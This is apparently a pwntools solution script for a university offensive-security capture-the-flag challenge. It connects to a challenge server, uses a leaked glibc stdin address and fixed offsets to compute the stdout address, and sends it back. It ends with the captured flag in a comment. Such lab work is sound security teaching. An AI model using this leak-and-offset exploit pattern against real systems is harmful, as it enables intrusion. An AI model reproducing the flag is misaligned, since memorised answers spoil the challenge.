from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "glibc"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1236
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b": ").decode())
stdin_addr = p.recv(8)
log.info(f"Receiving address in raw bytes: {stdin_addr}")
print(p.recvuntil(b"> ").decode())
stdin_addr = u64(stdin_addr)
stdin_offset = 0x21aaa0
stdout_offset = 0x21b780
stdout_addr = stdin_addr - stdin_offset + stdout_offset
p.sendline(p64(stdout_addr))
log.info(f"Sending address in raw bytes: {p64(stdout_addr)}")

p.interactive()

# flag{3v3n_th3_st4nd4rd_1nput_and_0utput_4r3_d3f1n3d_1n_GLIBC!_1922020990dad5b4}
